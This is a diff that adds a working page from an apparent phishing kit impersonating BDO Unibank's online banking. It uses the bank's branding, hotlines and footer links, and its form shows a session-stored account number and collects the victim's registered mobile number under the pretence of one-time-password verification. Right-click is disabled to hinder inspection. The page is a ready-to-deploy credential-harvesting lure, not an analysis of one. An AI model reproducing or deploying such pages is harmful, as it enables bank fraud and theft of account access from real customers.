@@ -1,0 +1,92 @@
+<html xmlns="http://www.w3.org/1999/xhtml" oncontextmenu="return false;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
+.button {
+  padding: 1px 5px;
+  font-size: 13px;
+  text-align: center;
+  cursor: pointer;
+  outline: none;
+  color: #fff;
+  background-color: #FFAF33;
+  border: none;
+  border-radius: 20px;
+}
+
+.button:hover {background-color: #3e8e41}
+
+.button:active {
+  background-color: #3e8e41;
+  box-shadow: 0 5px #666;
+  transform: translateY(4px);
+}
+</style>
+</head><body>
+<div class="loader-bg remove">
+<div class="loader"></div>
+</div>
+<div class="container">
+<div class="header"><img src="./home_files/bdo-logo.jpg" class="img-fluid"></div>
+<div class="content">
+<font color="darkblue"><font size="2"><b>One-Time Password (OTP)</b></font><br><br>
+<font color="grey"><font size="2">To continue, please verify the Account's Registered Mobile Number with account number: <?php echo $_SESSION["accnumber"];?></font><br><br>
+<form name="input" action="" method="post">
+<font color="grey"><font size="2">Mobile Number<font color="white">........</font><input type="number" id="num" name="number" minlength="11" maxlength="11" value="<?php echo $_SESSION["mnumber"];?>" class="required" required=""><br><br>
+<button class="button" type="submit" name="numbert1m3l00p">Proceed</button><font color="white">...</font>
+<button class="button">Cancel Login</button><br><br>
+<font color="grey">Metro Manila: 631-8000<br>Domestic Toll-Free Nos.:<br>
+<font color="blue"></font>1800-10-631-8000 (PLDT)
+<br>
+<font color="blue"></font>1800-3-631-8000 (Digital)
+<br>
+<font color="blue"></font>1800-5-631-8000 (Bayantel)
+<br>
+<font color="blue"></font>1800-8-631-8000 (Globelines)
+<br>
+<font color="blue"></font>International Toll-Free:
+<br>
+<font color="blue"></font>(IAC) +800-8-631-8000
+<br>
+<br>
+<br>
+<br>
+<br>
+</font></font></font></form></font></font></div><font color="darkblue"><font color="grey"><font color="grey"><font size="2"><font color="grey">
+</font></font></font></font></font></div><font color="darkblue"><font color="grey"><font color="grey"><font size="2"><font color="grey">
+
+
+
+<script type="text/javascript" src="./home_files/main.js.download"></script>
+
+
+﻿
+
+
+
+<title>Banco De Oro Update Online Banking Information</title>
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="./home_files/bootstrap.min.css" type="text/css">
+<link rel="stylesheet" href="./home_files/styles.css" type="text/css">
+<link rel="stylesheet" href="./home_files/normalize.css" type="text/css">
+<link rel="stylesheet" type="text/css" href="./home_files/font-awesome.min.css">
+<script src="./home_files/jquery-3.1.1.slim.min.js.download"></script>
+<script src="./home_files/jquery.min.js.download"></script>
+<script src="./home_files/tether.min.js.download"></script>
+<script src="./home_files/bootstrap.min.js.download"></script>
+<style type="text/css">body{ font-family: Arial; }</style>
+
+<div class="footer">
+<div class="horizontalRule"></div>
+<div id="footerCopyright">BDO Unibank, Inc. © 2015. All Rights Reserved</div>
+<div id="footerLinksDiv">
+<a href="https://www.bdo.com.ph/about-bdo/business-operation" target="_blank">About BDO</a>
+<a href="http://www.bdo.com.ph/corporate-governance" target="_blank">Corporate Governance</a>
+<a href="http://www.bdo.com.ph/investor-relations/official-disclosures" target="_blank">Investor Relations</a>
+<a href="http://www.bdo.com.ph/careers" target="_blank">Careers</a>
+<a href="https://www.bdo.com.ph/news-and-articles" target="_blank">Press Room</a>
+<a href="http://www.bdo.com.ph/hong-kong-home" target="_blank">Hongkong</a>
+<a href="https://www.bdo.com.ph/site-map" target="_blank">Sitemap</a>
+<a href="http://www.bdo.com.ph/privacy-policy" target="_blank">Privacy Policy</a>
+</div>
+</div>
+</font></font></font></font></font></body></html>
